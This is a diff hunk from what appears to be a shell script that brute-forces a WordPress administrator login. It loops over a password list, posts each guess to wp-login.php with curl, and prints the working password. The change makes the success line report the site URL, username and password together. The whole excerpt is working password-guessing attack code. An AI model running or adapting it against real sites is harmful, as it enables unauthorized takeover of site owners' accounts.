@@ -80,7 +80,7 @@ cat "$WP_PASSWORD" | while read line;
 		echo $line
 		REQ=`curl -s -b "$COOKIE_PATH" -A "$USER_AGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`
 
-		if [ "$REQ" == "" ]; then echo "The password is: $line"; rm "$COOKIE_PATH"; exit; fi
+		if [ "$REQ" == "" ]; then echo "$WP_URL Username: $WP_ADMIN password: $line "; rm "$COOKIE_PATH"; exit; fi
 	}
 	done
 
